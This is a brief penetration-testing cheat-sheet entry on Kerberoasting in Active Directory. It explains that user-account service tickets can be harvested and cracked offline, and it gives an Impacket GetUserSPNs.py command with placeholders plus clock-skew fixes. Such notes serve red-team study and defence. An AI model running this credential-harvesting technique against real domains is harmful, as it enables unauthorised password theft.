# 🔥 Kerberoasting

* The goal of **Kerberoasting** is to harvest **TGS tickets for services that run on behalf of user accounts** in the AD, not computer accounts. Thus, **part** of these TGS **tickets are** **encrypted** with **keys** derived from user passwords. As a consequence, their credentials could be **cracked offline**.

```bash
// Collecting the TGS (Impacket)
GetUserSPNs.py <DOMAIN_NAME>/<USER>:<PASS> -dc-ip <DC_IP> -request
```

**Note:**

If you find this **error** from Linux: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** it because of your local time, you need to synchronise the host with the DC. There are a few options:

* `ntpdate <IP of DC>` - Deprecated as of Ubuntu 16.04
* `rdate -n <IP of DC>`
